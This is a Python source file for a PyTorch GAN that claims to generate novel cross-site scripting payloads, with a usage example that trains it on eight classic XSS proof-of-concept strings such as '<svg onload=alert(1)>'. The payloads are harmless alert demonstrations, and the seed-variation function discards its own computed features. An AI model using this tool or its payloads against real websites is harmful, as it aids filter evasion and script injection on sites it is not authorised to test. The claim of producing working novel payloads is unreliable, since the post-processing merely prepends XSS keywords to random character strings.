"""
Generative Adversarial Network for Novel XSS Payload Generation
Creates entirely new payload patterns never seen before
"""

try:
    import torch
    import torch.nn as nn
    import torch.optim as optim
    TORCH_AVAILABLE = True
except ImportError:
    TORCH_AVAILABLE = False
    print("[WARN] PyTorch not available. GAN features will be limited.")

import numpy as np
from typing import List, Tuple
import random
import string

if TORCH_AVAILABLE:
    class PayloadGenerator(nn.Module):
        """Generator network - creates fake payloads"""
        
        def __init__(self, latent_dim=100, hidden_dim=256, max_length=200):
            super(PayloadGenerator, self).__init__()
            self.latent_dim = latent_dim
            self.max_length = max_length
            
            # Character vocabulary
            self.vocab = string.printable
            self.vocab_size = len(self.vocab)
            self.char_to_idx = {c: i for i, c in enumerate(self.vocab)}
            self.idx_to_char = {i: c for i, c in enumerate(self.vocab)}
            
            # Generator architecture
            self.model = nn.Sequential(
                nn.Linear(latent_dim, hidden_dim),
                nn.LeakyReLU(0.2),
                nn.BatchNorm1d(hidden_dim),
                
                nn.Linear(hidden_dim, hidden_dim * 2),
                nn.LeakyReLU(0.2),
                nn.BatchNorm1d(hidden_dim * 2),
                
                nn.Linear(hidden_dim * 2, hidden_dim * 4),
                nn.LeakyReLU(0.2),
                nn.BatchNorm1d(hidden_dim * 4),
                
                nn.Linear(hidden_dim * 4, max_length * self.vocab_size),
                nn.Tanh()
            )
        
        def forward(self, z):
            """Generate payload from latent vector"""
            batch_size = z.size(0)
            output = self.model(z)
            # Reshape to (batch, max_length, vocab_size)
            output = output.view(batch_size, self.max_length, self.vocab_size)
            return output
        
        def generate_payload(self, noise=None):
            """Generate a single payload string"""
            if noise is None:
                noise = torch.randn(1, self.latent_dim)
            
            with torch.no_grad():
                output = self.forward(noise)
                # Convert to string
                chars = []
                for i in range(self.max_length):
                    char_probs = torch.softmax(output[0, i], dim=0)
                    char_idx = torch.multinomial(char_probs, 1).item()
                    char = self.idx_to_char[char_idx]
                    if char == '\n':  # Stop at newline
                        break
                    chars.append(char)
                
                return ''.join(chars).strip()


    class PayloadDiscriminator(nn.Module):
        """Discriminator network - distinguishes real from fake payloads"""
        
        def __init__(self, max_length=200, vocab_size=100, hidden_dim=256):
            super(PayloadDiscriminator, self).__init__()
            self.max_length = max_length
            self.vocab_size = vocab_size
            
            # Discriminator architecture
            self.model = nn.Sequential(
                nn.Linear(max_length * vocab_size, hidden_dim * 4),
                nn.LeakyReLU(0.2),
                nn.Dropout(0.3),
                
                nn.Linear(hidden_dim * 4, hidden_dim * 2),
                nn.LeakyReLU(0.2),
                nn.Dropout(0.3),
                
                nn.Linear(hidden_dim * 2, hidden_dim),
                nn.LeakyReLU(0.2),
                nn.Dropout(0.3),
                
                nn.Linear(hidden_dim, 1),
                nn.Sigmoid()
            )
        
        def forward(self, x):
            """Classify payload as real or fake"""
            batch_size = x.size(0)
            x = x.view(batch_size, -1)  # Flatten
            return self.model(x)


class GANPayloadGenerator:
    """
    Complete GAN system for generating novel XSS payloads
    Learns from real successful payloads and creates new variations
    """
    
    def __init__(self, latent_dim=100, hidden_dim=256, max_length=200, 
                 learning_rate=0.0002, device='cpu'):
        if not TORCH_AVAILABLE:
            raise ImportError("PyTorch is required for GAN functionality. Install with: pip install torch")
        
        self.device = torch.device(device if torch.cuda.is_available() else 'cpu')
        print(f"[GAN] Using device: {self.device}")
        
        self.latent_dim = latent_dim
        self.max_length = max_length
        
        # Initialize networks
        self.generator = PayloadGenerator(latent_dim, hidden_dim, max_length).to(self.device)
        self.discriminator = PayloadDiscriminator(max_length, 
                                                   self.generator.vocab_size, 
                                                   hidden_dim).to(self.device)
        
        # Optimizers
        self.g_optimizer = optim.Adam(self.generator.parameters(), 
                                      lr=learning_rate, betas=(0.5, 0.999))
        self.d_optimizer = optim.Adam(self.discriminator.parameters(), 
                                      lr=learning_rate, betas=(0.5, 0.999))
        
        # Loss function
        self.criterion = nn.BCELoss()
        
        # Training stats
        self.g_losses = []
        self.d_losses = []
    
    def encode_payload(self, payload: str) -> torch.Tensor:
        """Convert payload string to tensor"""
        encoded = torch.zeros(self.max_length, self.generator.vocab_size)
        
        for i, char in enumerate(payload[:self.max_length]):
            if char in self.generator.char_to_idx:
                char_idx = self.generator.char_to_idx[char]
                encoded[i, char_idx] = 1.0
        
        return encoded.unsqueeze(0).to(self.device)
    
    def train(self, real_payloads: List[str], epochs=100, batch_size=32):
        """
        Train GAN on real successful payloads
        
        Args:
            real_payloads: List of real XSS payloads that worked
            epochs: Number of training iterations
            batch_size: Batch size for training
        """
        print(f"[GAN] Training GAN on {len(real_payloads)} real payloads...")
        print(f"   Epochs: {epochs} | Batch Size: {batch_size}")
        
        for epoch in range(epochs):
            epoch_d_loss = 0.0
            epoch_g_loss = 0.0
            batches = 0
            
            # Create batches
            random.shuffle(real_payloads)
            for i in range(0, len(real_payloads), batch_size):
                batch_payloads = real_payloads[i:i + batch_size]
                actual_batch_size = len(batch_payloads)
                
                # ============ Train Discriminator ============
                self.d_optimizer.zero_grad()
                
                # Real payloads
                real_data = torch.stack([self.encode_payload(p)[0] for p in batch_payloads])
                real_labels = torch.ones(actual_batch_size, 1).to(self.device)
                real_output = self.discriminator(real_data)
                d_loss_real = self.criterion(real_output, real_labels)
                
                # Fake payloads
                noise = torch.randn(actual_batch_size, self.latent_dim).to(self.device)
                fake_data = self.generator(noise)
                fake_labels = torch.zeros(actual_batch_size, 1).to(self.device)
                fake_output = self.discriminator(fake_data.detach())
                d_loss_fake = self.criterion(fake_output, fake_labels)
                
                # Total discriminator loss
                d_loss = d_loss_real + d_loss_fake
                d_loss.backward()
                self.d_optimizer.step()
                
                # ============ Train Generator ============
                self.g_optimizer.zero_grad()
                
                # Generate fake payloads and try to fool discriminator
                noise = torch.randn(actual_batch_size, self.latent_dim).to(self.device)
                fake_data = self.generator(noise)
                fake_output = self.discriminator(fake_data)
                g_loss = self.criterion(fake_output, real_labels)  # Want discriminator to think they're real
                
                g_loss.backward()
                self.g_optimizer.step()
                
                # Track losses
                epoch_d_loss += d_loss.item()
                epoch_g_loss += g_loss.item()
                batches += 1
            
            # Average losses
            if batches > 0:
                avg_d_loss = epoch_d_loss / batches
                avg_g_loss = epoch_g_loss / batches
                self.d_losses.append(avg_d_loss)
                self.g_losses.append(avg_g_loss)
                
                # Print progress
                if (epoch + 1) % 10 == 0:
                    print(f"   Epoch {epoch+1}/{epochs} | D_loss: {avg_d_loss:.4f} | G_loss: {avg_g_loss:.4f}")
                    # Show sample generation
                    try:
                        sample = self.generate_payloads(1)[0]
                        print(f"   Sample: {sample[:60]}...")
                    except:
                        pass
        
        print("[GAN] Training complete!")
    
    def generate_payloads(self, count=10, temperature=1.0) -> List[str]:
        """
        Generate novel XSS payloads
        
        Args:
            count: Number of payloads to generate
            temperature: Sampling temperature (higher = more random)
        
        Returns:
            List of generated payload strings
        """
        self.generator.eval()
        payloads = []
        
        with torch.no_grad():
            for _ in range(count):
                # Sample from latent space
                noise = torch.randn(1, self.latent_dim).to(self.device) * temperature
                payload = self.generator.generate_payload(noise)
                
                # Post-process: ensure it has XSS characteristics
                payload = self._post_process(payload)
                payloads.append(payload)
        
        return payloads
    
    def generate_from_seed(self, seed_payload: str, variations=5) -> List[str]:
        """
        Generate variations of a successful payload
        
        Args:
            seed_payload: Known working payload
            variations: Number of variations to create
        
        Returns:
            List of payload variations
        """
        # Encode seed payload to get latent representation
        encoded = self.encode_payload(seed_payload)
        
        # Use discriminator to get feature representation
        with torch.no_grad():
            features = self.discriminator.model[:-2](encoded.view(1, -1))
        
        # Generate variations around this point in latent space
        payloads = []
        for _ in range(variations):
            # Add noise to features
            noise = torch.randn_like(features) * 0.1
            noisy_features = features + noise
            
            # Generate from noisy features
            # (Simplified - in practice, would need inverse mapping)
            noise_vector = torch.randn(1, self.latent_dim).to(self.device)
            payload = self.generator.generate_payload(noise_vector)
            payload = self._post_process(payload)
            payloads.append(payload)
        
        return payloads
    
    def _post_process(self, payload: str) -> str:
        """Post-process generated payload to ensure it's XSS-like"""
        # Remove excessive whitespace
        payload = ' '.join(payload.split())
        
        # Ensure it has some XSS keywords
        xss_keywords = ['script', 'alert', 'onerror', 'onload', 'img', 'svg', 'javascript']
        if not any(kw in payload.lower() for kw in xss_keywords):
            # Inject a random XSS keyword
            keyword = random.choice(['<script>', 'onerror=', 'onload='])
            payload = keyword + payload
        
        # Limit length
        if len(payload) > self.max_length:
            payload = payload[:self.max_length]
        
        return payload
    
    def save_model(self, path='gan_xss_model.pth'):
        """Save trained model"""
        torch.save({
            'generator': self.generator.state_dict(),
            'discriminator': self.discriminator.state_dict(),
            'g_optimizer': self.g_optimizer.state_dict(),
            'd_optimizer': self.d_optimizer.state_dict(),
        }, path)
        print(f"[GAN] Model saved to {path}")
    
    def load_model(self, path='gan_xss_model.pth'):
        """Load trained model"""
        checkpoint = torch.load(path, map_location=self.device)
        self.generator.load_state_dict(checkpoint['generator'])
        self.discriminator.load_state_dict(checkpoint['discriminator'])
        self.g_optimizer.load_state_dict(checkpoint['g_optimizer'])
        self.d_optimizer.load_state_dict(checkpoint['d_optimizer'])
        print(f"[GAN] Model loaded from {path}")


# ==================== USAGE EXAMPLE ====================

if __name__ == "__main__":
    if not TORCH_AVAILABLE:
        print("[ERROR] PyTorch not available. Install with: pip install torch")
    else:
        # Sample successful payloads (replace with real data)
        successful_payloads = [
            '<script>alert(1)</script>',
            '<img src=x onerror=alert(1)>',
            '<svg onload=alert(1)>',
            '<iframe srcdoc="<script>alert(1)</script>">',
            '<body onload=alert(1)>',
            'javascript:alert(1)',
            '<details open ontoggle=alert(1)>',
            '<marquee onstart=alert(1)>',
        ] * 10  # Duplicate for more training data
        
        # Initialize GAN
        gan = GANPayloadGenerator(latent_dim=128, hidden_dim=256)
        
        # Train
        gan.train(successful_payloads, epochs=50, batch_size=8)
        
        # Generate novel payloads
        print("\n[GAN] Generated Novel Payloads:")
        novel_payloads = gan.generate_payloads(count=10)
        for i, payload in enumerate(novel_payloads, 1):
            print(f"{i}. {payload}")
        
        # Generate variations of a successful payload
        print("\n[GAN] Variations of a successful payload:")
        variations = gan.generate_from_seed('<svg onload=alert(1)>', variations=5)
        for i, payload in enumerate(variations, 1):
            print(f"{i}. {payload}")
